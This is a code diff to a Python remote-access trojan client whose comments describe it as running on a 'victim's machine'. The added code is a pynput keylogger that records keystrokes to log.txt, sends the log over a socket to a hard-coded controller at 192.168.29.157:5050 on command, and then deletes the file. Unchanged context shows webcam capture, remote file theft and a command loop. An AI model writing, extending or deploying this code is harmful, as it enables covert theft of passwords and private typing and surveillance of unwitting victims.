@@ -12,16 +12,19 @@ import pyautogui
 import numpy as np 
 import cv2
 import pyscreenshot as ImageGrab
+from pynput.keyboard import Listener,Key 
 import platform
 
-
+count=0 # to store count of keys logged
 
 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) # it will create a socket for outgoing connection from victim's machine
 
 #host="KartikBansal-35135.portmap.io"  # it will store static IP of server/ dynamic IP of machine on which server.py file is running
 #port=35135  # it will store port number on which server is listening
-host="192.168.1.6"
+host="192.168.29.157"
 port=5050
+
+
 
 s.connect((host,port)) # it requests a connection from victim's socket to the specified socket(host,port) passed as arguement which belongs to server
                        # this request is accepted by s.accept() function at server's end and 3-way hanshake mechanism is initiated
@@ -63,6 +66,29 @@ def capture_webcam():
     vid.release()
     out.release()
     cv2.destroyAllWindows()
+
+# keylogger code
+def capture_keys():
+
+	def on_press(key):
+		global count
+		count+=1
+		with open("log.txt","a") as f:
+			key=str(key).replace("Key.","")
+			key=key.replace("'","")
+			f.write(key)
+
+
+	def on_release(key):
+		global count 
+		if key == Key.esc or count > 50:
+			count=0
+			return False
+
+	with Listener(on_press=on_press,on_release=on_release) as listener:
+			listener.join()
+
+
 
 
 while True:  # An infinite loop to execute multiple commands recieved from server
@@ -125,6 +151,7 @@ while True:  # An infinite loop to execute multiple commands recieved from serve
 
         if data[:].decode("utf-8").split(" ")[0] == "getfile":
             filepath=data[:].decode("utf-8").split(" ")[1]
+            filename=os.path.basename(filepath)
             s.send("sending_file".encode())
             s.recv(2048)
             try:
@@ -192,7 +219,28 @@ while True:  # An infinite loop to execute multiple commands recieved from serve
             response=os.getcwd()+"> "
             s.send(response.encode())
             continue
-        
+
+        if data[:].decode() == "keylogger":
+            s.send("Logging_keys".encode())
+            s.recv(1024)
+            capture_keys()
+            s.send("done".encode())
+            s.recv(1024)
+            f=open("log.txt","rb")
+            data=f.read()
+            l=len(data)
+            s.send(str(l).encode())
+            s.recv(1024)
+            s.send(data)
+            s.recv(1024)
+            f.close()
+            os.remove("log.txt")
+            output=os.getcwd()+"> "
+            s.send(output.encode())
+            continue
+
+
+
         if data[:2].decode("utf-8") == "cd":   # handling for cd command which dont generate output and just switches between directories
             path=data[3:].decode("utf-8")      # new directory path
             os.chdir(path)                     # change current working directory
